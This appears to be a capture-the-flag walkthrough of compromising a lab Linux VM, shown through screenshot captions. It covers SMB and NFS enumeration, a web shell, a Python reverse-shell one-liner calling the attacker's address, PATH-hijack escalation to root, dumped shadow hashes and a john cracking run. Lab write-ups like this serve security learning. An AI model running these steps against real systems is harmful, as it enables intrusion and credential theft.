# Escalate_Linux
06 April 2022
12:40 AM

<img src="Escalate_Linux/media/image1.png" style="width:5.78333in;height:6.65833in" />

<img src="Escalate_Linux/media/image2.png" style="width:5.73333in;height:4.075in" alt="139/tcp 445/tcp 2049/tcp 39677/tcp 43225/tcp 45089/tcp 51473/tcp open open open open open open open netbios-ssn netbios-ssn nfs act nlockmgr mountd mountd mountd (workgroup: WORKGROUP) Samba smbd 3. X - samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) (RPC #100227) 3 1-4 (RPC #100021) 1-3 (RPC #100005) 1-3 (RPC #1ØØØØ5) 1-3 (RPC #100005) Service Info: Host: LINUX Host script results: smb-os-discovery: OS: Windows 6.1 (samba 4.7.6-Ubuntu) Computer name: osboxes NetBIOS computer name: LINUX\XØØ Domain name: \xøø FQDN: osboxes system time: clock-skew: mean: lh2Ømøøs, deviation: 2h18m34s, median: Os nbstat: NetBIOS name: Names : smb-securi ty-mode : account _ used: guest authentication level: LINUX, NetBIOS user: NetBIOS MAC• Flags: Flags: &lt;unique&gt;&lt;active&gt; Flags: Flags: &lt;group&gt;&lt;active&gt; Flags: &lt;group&gt;&lt;active&gt; Flags: Flags: &lt;group&gt;&lt;active&gt; user . &lt;unknown&gt; (unknown) " />

<img src="Escalate_Linux/media/image3.png" style="width:5.825in;height:0.975in" alt="(kaliS kali $ smbmap -H &quot;192.168.43.168&quot; [+] Guest session 192.168.43.168 Disk liteshare IPC$ kali • 445 IP: 192.168.43.168. Name : permissions NO ACCESS NO ACCESS commen t IPC Service (Linux Lite Shares) " />

<img src="Escalate_Linux/media/image4.png" style="width:6in;height:2.58333in" />

<img src="Escalate_Linux/media/image5.png" style="width:5.96667in;height:0.90833in" alt="kali ) — [ —/Desktop/ctfJ nfs 192.168.43.168:/home/user5 user5 sudo mount -t [sudo] password for kali: " />

<img src="Escalate_Linux/media/image6.png" style="width:5.95833in;height:1.03333in" alt="kaliS kali ) - [&quot;Desktop/ctf] L—$ cd user5 (kaliS &quot;Desktop/ctf/user5J Desktop Documents Downloads Is Music Pictures Public Templates Videos " />

file found in directory fuzzing
/shell.php

<img src="Escalate_Linux/media/image7.png" style="width:5.3in;height:1.25833in" alt="c O a 192.168.43.168/shell.php Google HackingDB Vigenere Solver LxdPrivilege Escalatio-.. ppass cmd as get parameter*/ " />

<img src="Escalate_Linux/media/image8.png" style="width:4.66667in;height:1.25833in" alt="Google Hacking DB Vigenere Solver Lid Privilege Escalation lusr/bin/python Ppass cmd as get parameter&quot; " />

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.43.208",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

<img src="Escalate_Linux/media/image9.png" style="width:5.86667in;height:1.36667in" alt="katiS kali)- nc -nvlp 9001 listening on [any] 9001 connect to [192.168.43.208] from (UNKNOWN) [192.168.43.168] 58788 $ id uid=1øø5(user6) groups=1øø5(user6) " />

<img src="Escalate_Linux/media/image10.png" style="width:4.95in;height:6.725in" alt="//User64 home U user$l/ Is -al . [script nano Is Is PATH 4PATH $PATH export export PATH=. :$PATH 4 PATH $PATH Is chmod +x Is . [script dir dir scipt dir script su root ./script export :$PATH . / script Is cat .bash_history " />

<img src="Escalate_Linux/media/image11.png" style="width:5.775in;height:1.9in" alt="su root LLLUser6 home T userSO ./script Desktop Downloads Pictures Templates Is Documents Music Public Videos script / I home I user5 export PATH=. :$PATH user6 / I home I user5 ./script user6 uid=ø(root) gid=ø(root) root root : $6$mqjgc FoM$X/qNpZR6gXPAxdgDj 7cPaYf zPSmgATM9cwD1 : 18050 : : 99999 : 7 : um-data: x " />

<img src="Escalate_Linux/media/image12.png" style="width:5.75in;height:2.11667in" alt="• $6 $9iyn/1Cu$ux10ZYhh FSAwJ8DPj r j r12Wv. Pz9DahMTfwpw1UC5ybyBGpuHToN11 jTqMLGShØR2Ch41 j EH2RJhZØ . userl. • 18050. • $6$7gVE7KgT$ud1VN80wYCbFveie04CJQ10McEgcfKqa24ivRs/MNAmmPeudsz/P3QeCMHj8UL1 vSufZmp3TodaW11FSZCKG5. user2 . • $6$paKeECW4$5YMn9UU4YBYCjØLP4QwaGt/S1aGØZS73EOJXh . RtøebjprnsBrnuGUwrgBamqccx7qzøswJouzrqn . GM69aaWJOØ . user3 . • 18051 • $6$øpxj6KPI $NA5S/2yN3TT JbPypEnsqYe1 PrgbfccHntMggLdU2 eM5/23dnosIpmD8sRJw11PyDFgQXH52kYk. bz c6sAVSWm. user4 . : 18051 • • $6 $wndyax19$cOEaymjMiRi1j z zaSa FVXD7 L Fx20wOxeonEdCW. GszLm77kØd5GpQZz JpcwvufmRndcYatr5ZQESdqb1sOb9n/ user5. : 18051 • • $6 $Y9wYnrUW$i hpBL4g3GswEay/AqgrKz VI n8uKhWi BNI hdKm6DdX7WtDZcUbh/ 5w/tQELa3 L t iyT Fws L sWXubsSCf z Rcaolu/ . user6. • 18051 mysql : $6 F$NZDtY392guzyrveKnorsea60Qpv870pEj Eef IUPbkrfmrHG/10nKdnYEecøsøzBcQFZ. sno/ : 18053 • $6 $5RBu0GFi$eJrQ4/xf2 IXa7 eykma1VKiRKJ4w3vFEOEOtYinnk1Ra .89dXtGQXdH . Rdyø . user7. • 18052 • • $6$fdtu1Q7i$G9THW4j6kUY4bX1f7C/OXQtntW123LRVRf1kJ6akDLPH1qB5PJLD4AEYZ7WXSEhMC2XC4CqiTXATfb2øxwaxp user8 . .:18052. user6 Password : su root user welcome to Linux Lite 4.4 you are running in superuser mode, Tuesday 05 April 2022, 15:53:28 Memory usage: 331/985MB (33.60%) Disk Usage: 5/217GB (3%) users:» whoami root root be very careful. " />

<img src="Escalate_Linux/media/image13.png" style="width:5.7in;height:1.69167in" alt="(kali@ —&#39;Desktop/ctf] $ sudo john wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 openMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status root lg DONE (2022-04-05 15:53) 3.571g/s 914.2p/s 914.2c/s 914.2C/s 123456. Use the &quot;—show&quot; option to display all of the cracked passwords reliably Session completed. . freedom " />
